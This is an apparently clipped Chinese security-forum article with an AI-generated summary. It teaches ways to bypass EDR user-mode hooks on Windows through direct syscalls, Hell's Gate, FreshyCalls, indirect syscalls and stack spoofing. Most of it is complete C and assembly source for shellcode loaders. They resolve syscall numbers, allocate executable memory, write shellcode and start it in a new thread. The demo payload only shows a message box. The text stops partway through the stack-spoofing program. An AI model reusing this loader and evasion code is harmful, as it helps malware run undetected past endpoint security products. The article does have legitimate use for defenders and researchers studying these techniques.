---
title: 【先知】系统调用(syscall)
source: https://xz.aliyun.com/news/92911
source_host: xz.aliyun.com
clip_date: 2026-10-09T16:01:35+08:00
trace_id: 832edbed-b6d1-4980-b878-94c5004a308a
content_hash: 32cb0e29b3ab84bd4b128d287bda9e22eefe27643d5dc3a01035e90ea10e4da0
status: synced
tags:
  - 先知
  - Android逆向
  - Windows逆向
series: null
feed_source: 先知安全技术社区
ai_summary: SSN 获取与 syscall 执行共六种绕过 EDR 用户态 Hook 的方案，核心是先拿对 SSN、再选 syscall 位置、最后处理返回地址伪装。
ai_summary_style: key-points:weak
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3f475244-d011-816c-b6a4-fc9c762f71da
ioc: null
---

> 💡 **AI 总结（key-points:weak）**
>
> SSN 获取与 syscall 执行共六种绕过 EDR 用户态 Hook 的方案，核心是先拿对 SSN、再选 syscall 位置、最后处理返回地址伪装。
> 
> - **Inline Hook 现状：** EDR 在内存里插 jmp 把执行流拐进 hooking.dll，判定非恶意才跳回 ntdll 执行 syscall；只读内存看不到真实指令，须去 ntdll.dll 文件里看汇编与 SSN。
> - **stub 特征：** ntdll 函数头为 `4C 8B D1 B8`（mov r10,rcx / mov eax,SSN），偏移 4 字节即 SSN；SSN 在 ntdll 中按序排列。
> - **直接调用：** 硬编码 SSN 或从 stub+4 动态解析，syscall 落在本模块 .text，异常易被检测；硬编码还会随系统升级失效。
> - **Hell's Gate：** 函数头被 Hook 时按 0x20 间距向上下邻居找 0x4C8BD1B8 stub，用其 SSN 加/减索引还原自身 SSN。
> - **FreshyCalls：** 不读字节，从导出表取所有 Zw 函数地址排序，下标即 SSN；函数头被改也不受影响。
> - **间接调用与栈欺骗：** 间接调用 jmp 到 ntdll 的 syscall;ret 位置，返回地址仍可能落在 exe；栈欺骗用 kernel32/kernelbase/ntdll 中的 `FF E3`(jmp rbx) gadget 伪造返回链，但仅骗过浅层栈回溯，ETW、内核回调与完整 call stack 仍可识别。

## Syscall

用户态 API Hook 让 EDR 能动态审查 Windows API。多数 EDR 用 **Inline Hook**：在内存里插入 jmp，把执行流拐进 EDR 的 hooking.dll。

研判当前 Windows API 不是恶意，就跳回 ntdll.dll，再 syscall 进内核；研判是恶意，就终止执行。

要看真正的汇编和 **SSN**，必须去 ntdll.dll 文件里看函数。其他地方往往只能看到跳进这个文件，看不到具体指令。

```plain
; __int64 NtSetUuidSeed()
                public NtSetUuidSeed
NtSetUuidSeed   proc near               ; DATA XREF: .rdata:0000000180177C74↓o
                                        ; .rdata:off_1801B8128↓o ...
                mov     r10, rcx        ; NtSetUuidSeed
                mov     eax, 1C3h
                test    byte ptr ds:7FFE0308h, 1
                jnz     short loc_180164615
                syscall                 ; Low latency system call
                retn
; ---------------------------------------------------------------------------
loc_180164615:                          ; CODE XREF: NtSetUuidSeed+10↑j
                int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
                                        ; DS:SI -> counted CR-terminated command string
                retn
NtSetUuidSeed   endp
```

在 IDA 里看这些 SSN 会发现是按顺序排的，比如 110、111，一直排到最后一个。

* * *

## 直接调用

就是直接获取 SSN，然后 syscall 进内核执行。可能被发现：这段汇编一般在 ntdll 里，实际却落在本模块.text，有异常会被检测。

**硬编码**：直接把 SSN 写进汇编。

**动态解析 SSN**：加载 ntdll.dll，找到目标函数，偏移 4 字节就是 SSN。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/be63b950d69f4b41.png)

### 汇编

```plain
.data
public ssn_alloc
public ssn_write
public ssn_create
ssn_alloc  DWORD 0
ssn_write  DWORD 0
ssn_create DWORD 0

.code
public sysall
public syswir
public syscrea

sysall PROC
	mov r10, rcx
	mov eax, ssn_alloc
	syscall
	ret
sysall ENDP

syswir PROC
	mov r10, rcx
	mov eax, ssn_write
	syscall
	ret
syswir ENDP

syscrea PROC
	mov r10, rcx
	mov eax, ssn_create
	syscall
	ret
syscrea ENDP

END
```

### 源码

```c
#include<iostream>
#include<stdio.h>
#include<Windows.h>
#include<winternl.h>
using namespace std;
extern "C" NTSTATUS sysall(
	HANDLE a,PVOID* b,ULONG_PTR c,PSIZE_T d,ULONG e,ULONG f
);
extern "C" NTSTATUS syswir(
	HANDLE a,PVOID b,PVOID c,SIZE_T d,PSIZE_T e
);
extern "C" NTSTATUS syscrea(
	PHANDLE a, ACCESS_MASK b, PVOID c, HANDLE e, PVOID f, PVOID g, ULONG h, SIZE_T i, SIZE_T j, SIZE_T k, PVOID m
);
extern "C" DWORD ssn_alloc;
extern "C" DWORD ssn_write;
extern "C" DWORD ssn_create;

DWORD readssn(const char* name)
{
	HMODULE dll = GetModuleHandleA("ntdll.dll");
	BYTE* addr = (BYTE*)GetProcAddress(dll, name);
	if (!addr)
		return 0;
	if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
		return *(DWORD*)(addr + 4);
	return 0;
}
int main()
{
	HMODULE user32 = LoadLibraryA("user32.dll");
	FARPROC pMessageBoxA = GetProcAddress(user32, "MessageBoxA");
	ssn_alloc = readssn("NtAllocateVirtualMemory");
	ssn_write = readssn("NtWriteVirtualMemory");
	ssn_create = readssn("NtCreateThreadEx");
	printf("ssn alloc=%X write=%X create=%X\n", ssn_alloc, ssn_write, ssn_create);
	if (!ssn_alloc || !ssn_write || !ssn_create)
		return 1;
	unsigned char shellcode[] = {
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x31, 0xC9,
		0x48, 0x8D, 0x15, 0x1B, 0x00, 0x00, 0x00,
		0x4C, 0x8D, 0x05, 0x24, 0x00, 0x00, 0x00,
		0x4D, 0x31, 0xC9,
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
		'H','e','l','l','o',0,0,0,0,0,0,0,0,0,0,0,
		's','y','s','c','a','l','l',0,0,0,0,0,0,0,0,0
	};
	memcpy(shellcode + 0x1A, &pMessageBoxA, sizeof(pMessageBoxA));

	PVOID pshellcode = NULL;
	SIZE_T region = sizeof(shellcode);
	NTSTATUS sta = sysall((HANDLE)-1, &pshellcode, 0, &region,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (sta != 0) {
		printf("sysall failed: 0x%X\n", sta);
		return 1;
	}
	sta = syswir((HANDLE)-1, pshellcode, shellcode, sizeof(shellcode), NULL);
	if (sta != 0) {
		printf("syswir failed: 0x%X\n", sta);
		return 1;
	}
	HANDLE htread = NULL;
	sta = syscrea(&htread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pshellcode, NULL, FALSE, 0, 0, 0, NULL);
	if (sta != 0) {
		printf("syscrea failed: 0x%X\n", sta);
		return 1;
	}
	WaitForSingleObject(htread, INFINITE);
	CloseHandle(htread);
	VirtualFree(pshellcode, 0, MEM_RELEASE);

	printf("Shellcode executed successfully.\n");
	return 0;
}
```

* * *

## Hell’s Gate（地狱之门）

程序被 Hook 时用。EDR 用 inline hook 改函数前几个机器码，这时读到的 SSN 是错的。

原理：每个 SSN 上下是连续的，按这个特征往两边查，就能找回需要的 SSN。两种找法：

1.  在本模块附近找 syscall，从上往下找到 0xB8，后面就是 SSN
2.  直接查上面或下面那个函数，没被 Hook 就用它的 SSN 减去（或加上）隔了几个函数，得到自己的 SSN

代码（asm 文件同上）：

```c
#include<iostream>
#include<stdio.h>
#include<Windows.h>
#include<winternl.h>
using namespace std;
extern "C" NTSTATUS sysall(
	HANDLE a,PVOID* b,ULONG_PTR c,PSIZE_T d,ULONG e,ULONG f
);
extern "C" NTSTATUS syswir(
	HANDLE a,PVOID b,PVOID c,SIZE_T d,PSIZE_T e
);
extern "C" NTSTATUS syscrea(
	PHANDLE a, ACCESS_MASK b, PVOID c, HANDLE e, PVOID f, PVOID g, ULONG h, SIZE_T i, SIZE_T j, SIZE_T k, PVOID m
);
extern "C" DWORD ssn_alloc;
extern "C" DWORD ssn_write;
extern "C" DWORD ssn_create;

typedef struct _LDR_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_ENTRY;

DWORD64 getfun(const char* name)
{
	PEB* peb = (PEB*)__readgsqword(0x60);
	LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
	DWORD64 dllbase = 0;
	for (LIST_ENTRY* cur = head->Flink; cur != head; cur = cur->Flink)
	{
		LDR_ENTRY* entry = CONTAINING_RECORD(cur, LDR_ENTRY, InMemoryOrderLinks);
		if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, L"ntdll.dll") == 0)
		{
			dllbase = (DWORD64)entry->DllBase;
			break;
		}
	}
	if (!dllbase)
		return 0;

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllbase;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllbase + dos->e_lfanew);
	DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exp1 = (PIMAGE_EXPORT_DIRECTORY)(dllbase + rva);
	DWORD* namerva = (DWORD*)(dllbase + exp1->AddressOfNames);
	DWORD* funrva = (DWORD*)(dllbase + exp1->AddressOfFunctions);
	WORD* ord = (WORD*)(dllbase + exp1->AddressOfNameOrdinals);
	for (DWORD i = 0; i < exp1->NumberOfNames; i++)
	{
		const char* str = (const char*)(dllbase + namerva[i]);
		if (!strcmp(name, str))
			return dllbase + funrva[ord[i]];
	}
	return 0;
}

static int is_stub(BYTE* p)//判断是否有被hook
{
	return p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8
		&& p[6] == 0x00 && p[7] == 0x00;
}

DWORD readssn1(const char* name)
{
	BYTE* p = (BYTE*)getfun(name);
	if (!p)
		return (DWORD)-1;

	if (is_stub(p))
		return *(DWORD*)(p + 4);

	for (int i = 1; i < 500; i++)
	{
		BYTE* down = p + i * 0x20;
		BYTE* up = p - i * 0x20;
		if (is_stub(down))
			return *(DWORD*)(down + 4) - i;
		if (is_stub(up))
			return *(DWORD*)(up + 4) + i;
	}
	return (DWORD)-1;
}
int main()
{
	HMODULE user32 = LoadLibraryA("user32.dll");
	FARPROC pMessageBoxA = GetProcAddress(user32, "MessageBoxA");
	ssn_alloc = readssn1("NtAllocateVirtualMemory");
	ssn_write = readssn1("NtWriteVirtualMemory");
	ssn_create = readssn1("NtCreateThreadEx");
	printf("ssn alloc=%X write=%X create=%X\n", ssn_alloc, ssn_write, ssn_create);
	if (ssn_alloc == (DWORD)-1 || ssn_write == (DWORD)-1 || ssn_create == (DWORD)-1)
		return 1;
	unsigned char shellcode[] = {
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x31, 0xC9,
		0x48, 0x8D, 0x15, 0x1B, 0x00, 0x00, 0x00,
		0x4C, 0x8D, 0x05, 0x24, 0x00, 0x00, 0x00,
		0x4D, 0x31, 0xC9,
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
		'H','e','l','l','o',0,0,0,0,0,0,0,0,0,0,0,
		's','y','s','c','a','l','l',0,0,0,0,0,0,0,0,0
	};
	memcpy(shellcode + 0x1A, &pMessageBoxA, sizeof(pMessageBoxA));

	PVOID pshellcode = NULL;
	SIZE_T region = sizeof(shellcode);
	NTSTATUS sta = sysall((HANDLE)-1, &pshellcode, 0, &region,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (sta != 0) {
		printf("sysall failed: 0x%X\n", sta);
		return 1;
	}
	sta = syswir((HANDLE)-1, pshellcode, shellcode, sizeof(shellcode), NULL);
	if (sta != 0) {
		printf("syswir failed: 0x%X\n", sta);
		return 1;
	}
	HANDLE htread = NULL;
	sta = syscrea(&htread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pshellcode, NULL, FALSE, 0, 0, 0, NULL);
	if (sta != 0) {
		printf("syscrea failed: 0x%X\n", sta);
		return 1;
	}
	WaitForSingleObject(htread, INFINITE);
	CloseHandle(htread);
	VirtualFree(pshellcode, 0, MEM_RELEASE);

	printf("Shellcode executed successfully.\n");
	return 0;
}
```

* * *

## FreshyCalls

完全不看汇编，从导出表入手。SSN 是排好序的，按导出函数地址排序，地址最小的是 0，往后推。只用看排序后的下标就能拿到 SSN，不用管有没有被 Hook。

```c
#include<iostream>
#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<winternl.h>
using namespace std;
extern "C" NTSTATUS sysall(
	HANDLE a,PVOID* b,ULONG_PTR c,PSIZE_T d,ULONG e,ULONG f
);
extern "C" NTSTATUS syswir(
	HANDLE a,PVOID b,PVOID c,SIZE_T d,PSIZE_T e
);
extern "C" NTSTATUS syscrea(
	PHANDLE a, ACCESS_MASK b, PVOID c, HANDLE e, PVOID f, PVOID g, ULONG h, SIZE_T i, SIZE_T j, SIZE_T k, PVOID m
);
extern "C" DWORD ssn_alloc;
extern "C" DWORD ssn_write;
extern "C" DWORD ssn_create;

typedef struct _LDR_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_ENTRY;

#define MAX_ZW 1024

struct ZwStub {
	const char* name;
	DWORD64 addr;
};

static ZwStub g_zw[MAX_ZW];
static int g_zw_count;

static int cmp_addr(const void* a, const void* b)
{
	DWORD64 x = ((const ZwStub*)a)->addr;
	DWORD64 y = ((const ZwStub*)b)->addr;
	if (x < y) return -1;
	if (x > y) return 1;
	return 0;
}

static DWORD64 ntdll_base()
{
	PEB* peb = (PEB*)__readgsqword(0x60);
	LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
	for (LIST_ENTRY* cur = head->Flink; cur != head; cur = cur->Flink)
	{
		LDR_ENTRY* entry = CONTAINING_RECORD(cur, LDR_ENTRY, InMemoryOrderLinks);
		if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, L"ntdll.dll") == 0)
			return (DWORD64)entry->DllBase;
	}
	return 0;
}

static void build_ssn_table()
{
	if (g_zw_count)
		return;

	DWORD64 dllbase = ntdll_base();
	if (!dllbase)
		return;

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllbase;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllbase + dos->e_lfanew);
	DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exp1 = (PIMAGE_EXPORT_DIRECTORY)(dllbase + rva);
	DWORD* namerva = (DWORD*)(dllbase + exp1->AddressOfNames);
	DWORD* funrva = (DWORD*)(dllbase + exp1->AddressOfFunctions);
	WORD* ord = (WORD*)(dllbase + exp1->AddressOfNameOrdinals);

	for (DWORD i = 0; i < exp1->NumberOfNames && g_zw_count < MAX_ZW; i++)
	{
		const char* str = (const char*)(dllbase + namerva[i]);
		if (str[0] != 'Z' || str[1] != 'w')
			continue;
		g_zw[g_zw_count].name = str;
		g_zw[g_zw_count].addr = dllbase + funrva[ord[i]];
		g_zw_count++;
	}
	qsort(g_zw, g_zw_count, sizeof(ZwStub), cmp_addr);
}

DWORD readssn1(const char* name)
{
	build_ssn_table();

	char zwname[128];
	const char* look = name;
	if (name[0] == 'N' && name[1] == 't')
	{
		zwname[0] = 'Z';
		zwname[1] = 'w';
		strcpy_s(zwname + 2, sizeof(zwname) - 2, name + 2);
		look = zwname;
	}

	for (int i = 0; i < g_zw_count; i++)
	{
		if (!strcmp(g_zw[i].name, look))
			return (DWORD)i;
	}
	return (DWORD)-1;
}

int main()
{
	HMODULE user32 = LoadLibraryA("user32.dll");
	FARPROC pMessageBoxA = GetProcAddress(user32, "MessageBoxA");
	ssn_alloc = readssn1("NtAllocateVirtualMemory");
	ssn_write = readssn1("NtWriteVirtualMemory");
	ssn_create = readssn1("NtCreateThreadEx");
	printf("ssn alloc=%X write=%X create=%X\n", ssn_alloc, ssn_write, ssn_create);
	if (ssn_alloc == (DWORD)-1 || ssn_write == (DWORD)-1 || ssn_create == (DWORD)-1)
		return 1;
	unsigned char shellcode[] = {
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x31, 0xC9,
		0x48, 0x8D, 0x15, 0x1B, 0x00, 0x00, 0x00,
		0x4C, 0x8D, 0x05, 0x24, 0x00, 0x00, 0x00,
		0x4D, 0x31, 0xC9,
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
		'H','e','l','l','o',0,0,0,0,0,0,0,0,0,0,0,
		's','y','s','c','a','l','l',0,0,0,0,0,0,0,0,0
	};
	memcpy(shellcode + 0x1A, &pMessageBoxA, sizeof(pMessageBoxA));

	PVOID pshellcode = NULL;
	SIZE_T region = sizeof(shellcode);
	NTSTATUS sta = sysall((HANDLE)-1, &pshellcode, 0, &region,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (sta != 0) {
		printf("sysall failed: 0x%X\n", sta);
		return 1;
	}
	sta = syswir((HANDLE)-1, pshellcode, shellcode, sizeof(shellcode), NULL);
	if (sta != 0) {
		printf("syswir failed: 0x%X\n", sta);
		return 1;
	}
	HANDLE htread = NULL;
	sta = syscrea(&htread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pshellcode, NULL, FALSE, 0, 0, 0, NULL);
	if (sta != 0) {
		printf("syscrea failed: 0x%X\n", sta);
		return 1;
	}
	WaitForSingleObject(htread, INFINITE);
	CloseHandle(htread);
	VirtualFree(pshellcode, 0, MEM_RELEASE);

	printf("Shellcode executed successfully.\n");
	return 0;
}
```

* * *

## 间接调用

直接 jmp 到 ntdll 里要执行的 syscall 位置。可能从栈上被发现：栈回溯和直接调用不一样。可以用栈欺骗，但还是有弊端。现在比较主流。

```c
#include<iostream>
#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<winternl.h>
using namespace std;
extern "C" NTSTATUS sysall(
	HANDLE a,PVOID* b,ULONG_PTR c,PSIZE_T d,ULONG e,ULONG f
);
extern "C" NTSTATUS syswir(
	HANDLE a,PVOID b,PVOID c,SIZE_T d,PSIZE_T e
);
extern "C" NTSTATUS syscrea(
	PHANDLE a, ACCESS_MASK b, PVOID c, HANDLE e, PVOID f, PVOID g, ULONG h, SIZE_T i, SIZE_T j, SIZE_T k, PVOID m
);
extern "C" DWORD ssn_alloc;
extern "C" DWORD ssn_write;
extern "C" DWORD ssn_create;
extern "C" UINT_PTR sys_addr;

typedef struct _LDR_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_ENTRY;

#define MAX_ZW 1024

struct ZwStub {
	const char* name;
	DWORD64 addr;
};

static ZwStub g_zw[MAX_ZW];
static int g_zw_count;

static int cmp_addr(const void* a, const void* b)
{
	DWORD64 x = ((const ZwStub*)a)->addr;
	DWORD64 y = ((const ZwStub*)b)->addr;
	if (x < y) return -1;
	if (x > y) return 1;
	return 0;
}

static DWORD64 ntdll_base()
{
	PEB* peb = (PEB*)__readgsqword(0x60);
	LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
	for (LIST_ENTRY* cur = head->Flink; cur != head; cur = cur->Flink)
	{
		LDR_ENTRY* entry = CONTAINING_RECORD(cur, LDR_ENTRY, InMemoryOrderLinks);
		if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, L"ntdll.dll") == 0)
			return (DWORD64)entry->DllBase;
	}
	return 0;
}

static void build_ssn_table()
{
	if (g_zw_count)
		return;

	DWORD64 dllbase = ntdll_base();
	if (!dllbase)
		return;

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllbase;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllbase + dos->e_lfanew);
	DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exp1 = (PIMAGE_EXPORT_DIRECTORY)(dllbase + rva);
	DWORD* namerva = (DWORD*)(dllbase + exp1->AddressOfNames);
	DWORD* funrva = (DWORD*)(dllbase + exp1->AddressOfFunctions);
	WORD* ord = (WORD*)(dllbase + exp1->AddressOfNameOrdinals);

	for (DWORD i = 0; i < exp1->NumberOfNames && g_zw_count < MAX_ZW; i++)
	{
		const char* str = (const char*)(dllbase + namerva[i]);
		if (str[0] != 'Z' || str[1] != 'w')
			continue;
		g_zw[g_zw_count].name = str;
		g_zw[g_zw_count].addr = dllbase + funrva[ord[i]];
		g_zw_count++;
	}
	qsort(g_zw, g_zw_count, sizeof(ZwStub), cmp_addr);

	for (int i = 0; i < g_zw_count && !sys_addr; i++)
	{
		BYTE* p = (BYTE*)g_zw[i].addr;
		for (int j = 0; j < 32; j++)
		{
			if (p[j] == 0x0F && p[j + 1] == 0x05 && p[j + 2] == 0xC3)
			{
				sys_addr = (UINT_PTR)(p + j);
				break;
			}
		}
	}
}

DWORD readssn1(const char* name)
{
	build_ssn_table();

	char zwname[128];
	const char* look = name;
	if (name[0] == 'N' && name[1] == 't')
	{
		zwname[0] = 'Z';
		zwname[1] = 'w';
		strcpy_s(zwname + 2, sizeof(zwname) - 2, name + 2);
		look = zwname;
	}

	for (int i = 0; i < g_zw_count; i++)
	{
		if (!strcmp(g_zw[i].name, look))
			return (DWORD)i;
	}
	return (DWORD)-1;
}

int main()
{
	HMODULE user32 = LoadLibraryA("user32.dll");
	FARPROC pMessageBoxA = GetProcAddress(user32, "MessageBoxA");
	ssn_alloc = readssn1("NtAllocateVirtualMemory");
	ssn_write = readssn1("NtWriteVirtualMemory");
	ssn_create = readssn1("NtCreateThreadEx");
	printf("ssn alloc=%X write=%X create=%X gadget=%p\n",
		ssn_alloc, ssn_write, ssn_create, (void*)sys_addr);
	if (ssn_alloc == (DWORD)-1 || ssn_write == (DWORD)-1 || ssn_create == (DWORD)-1 || !sys_addr)
		return 1;
	unsigned char shellcode[] = {
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x31, 0xC9,
		0x48, 0x8D, 0x15, 0x1B, 0x00, 0x00, 0x00,
		0x4C, 0x8D, 0x05, 0x24, 0x00, 0x00, 0x00,
		0x4D, 0x31, 0xC9,
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
		'H','e','l','l','o',0,0,0,0,0,0,0,0,0,0,0,
		's','y','s','c','a','l','l',0,0,0,0,0,0,0,0,0
	};
	memcpy(shellcode + 0x1A, &pMessageBoxA, sizeof(pMessageBoxA));

	PVOID pshellcode = NULL;
	SIZE_T region = sizeof(shellcode);
	NTSTATUS sta = sysall((HANDLE)-1, &pshellcode, 0, &region,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (sta != 0) {
		printf("sysall failed: 0x%X\n", sta);
		return 1;
	}
	sta = syswir((HANDLE)-1, pshellcode, shellcode, sizeof(shellcode), NULL);
	if (sta != 0) {
		printf("syswir failed: 0x%X\n", sta);
		return 1;
	}
	HANDLE htread = NULL;
	sta = syscrea(&htread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pshellcode, NULL, FALSE, 0, 0, 0, NULL);
	if (sta != 0) {
		printf("syscrea failed: 0x%X\n", sta);
		return 1;
	}
	WaitForSingleObject(htread, INFINITE);
	CloseHandle(htread);
	VirtualFree(pshellcode, 0, MEM_RELEASE);

	printf("Shellcode executed successfully.\n");
	return 0;
}
```

* * *

## 堆栈欺骗

正常程序执行完 ntdll 里的函数，返回的是 ntdll 或 kernel 里的某个位置。间接 syscall 的返回地址会直接落到 exe，栈回溯能看出来。

做法：伪造返回，先 ret 到 kernel 里 jmp rax 这类 gadget，真正的 exe 续执行地址放在对应寄存器里。

```c
#include<iostream>
#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<winternl.h>
using namespace std;
extern "C" NTSTATUS sysall(
	HANDLE a,PVOID* b,ULONG_PTR c,PSIZE_T d,ULONG e,ULONG f
);
extern "C" NTSTATUS syswir(
	HANDLE a,PVOID b,PVOID c,SIZE_T d,PSIZE_T e
);
extern "C" NTSTATUS syscrea(
	PHANDLE a, ACCESS_MASK b, PVOID c, HANDLE e, PVOID f, PVOID g, ULONG h, SIZE_T i, SIZE_T j, SIZE_T k, PVOID m
);
extern "C" DWORD ssn_alloc;
extern "C" DWORD ssn_write;
extern "C" DWORD ssn_create;
extern "C" UINT_PTR sys_addr;
extern "C" UINT_PTR jmp_gadget;

typedef struct _LDR_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_ENTRY;

#define MAX_ZW 1024

struct ZwStub {
	const char* name;
	DWORD64 addr;
};

static ZwStub g_zw[MAX_ZW];
static int g_zw_count;

static int cmp_addr(const void* a, const void* b)
{
	DWORD64 x = ((const ZwStub*)a)->addr;
	DWORD64 y = ((const ZwStub*)b)->addr;
	if (x < y) return -1;
	if (x > y) return 1;
	return 0;
}

static DWORD64 ntdll_base()
{
	PEB* peb = (PEB*)__readgsqword(0x60);
	LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
	for (LIST_ENTRY* cur = head->Flink; cur != head; cur = cur->Flink)
	{
		LDR_ENTRY* entry = CONTAINING_RECORD(cur, LDR_ENTRY, InMemoryOrderLinks);
		if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, L"ntdll.dll") == 0)
			return (DWORD64)entry->DllBase;
	}
	return 0;
}

static void build_ssn_table()
{
	if (g_zw_count)
		return;

	DWORD64 dllbase = ntdll_base();
	if (!dllbase)
		return;

	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllbase;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllbase + dos->e_lfanew);
	DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY exp1 = (PIMAGE_EXPORT_DIRECTORY)(dllbase + rva);
	DWORD* namerva = (DWORD*)(dllbase + exp1->AddressOfNames);
	DWORD* funrva = (DWORD*)(dllbase + exp1->AddressOfFunctions);
	WORD* ord = (WORD*)(dllbase + exp1->AddressOfNameOrdinals);

	for (DWORD i = 0; i < exp1->NumberOfNames && g_zw_count < MAX_ZW; i++)
	{
		const char* str = (const char*)(dllbase + namerva[i]);
		if (str[0] != 'Z' || str[1] != 'w')
			continue;
		g_zw[g_zw_count].name = str;
		g_zw[g_zw_count].addr = dllbase + funrva[ord[i]];
		g_zw_count++;
	}
	qsort(g_zw, g_zw_count, sizeof(ZwStub), cmp_addr);

	for (int i = 0; i < g_zw_count && !sys_addr; i++)
	{
		BYTE* p = (BYTE*)g_zw[i].addr;
		for (int j = 0; j < 32; j++)
		{
			if (p[j] == 0x0F && p[j + 1] == 0x05 && p[j + 2] == 0xC3)
			{
				sys_addr = (UINT_PTR)(p + j);
				break;
			}
		}
	}
}

DWORD readssn1(const char* name)
{
	build_ssn_table();

	char zwname[128];
	const char* look = name;
	if (name[0] == 'N' && name[1] == 't')
	{
		zwname[0] = 'Z';
		zwname[1] = 'w';
		strcpy_s(zwname + 2, sizeof(zwname) - 2, name + 2);
		look = zwname;
	}

	for (int i = 0; i < g_zw_count; i++)
	{
		if (!strcmp(g_zw[i].name, look))
			return (DWORD)i;
	}
	return (DWORD)-1;
}

static UINT_PTR find_jmp_rbx(HMODULE mod)
{
	if (!mod)
		return 0;
	BYTE* base = (BYTE*)mod;
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
	{
		if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
			continue;
		BYTE* p = base + sec[i].VirtualAddress;
		DWORD sz = sec[i].Misc.VirtualSize;
		if (!sz)
			sz = sec[i].SizeOfRawData;
		for (DWORD j = 0; j + 1 < sz; j++)
		{
			if (p[j] == 0xFF && p[j + 1] == 0xE3)
				return (UINT_PTR)(p + j);
		}
	}
	return 0;
}

int main()
{
	HMODULE user32 = LoadLibraryA("user32.dll");
	FARPROC pMessageBoxA = GetProcAddress(user32, "MessageBoxA");
	ssn_alloc = readssn1("NtAllocateVirtualMemory");
	ssn_write = readssn1("NtWriteVirtualMemory");
	ssn_create = readssn1("NtCreateThreadEx");
	jmp_gadget = find_jmp_rbx(GetModuleHandleA("kernel32.dll"));
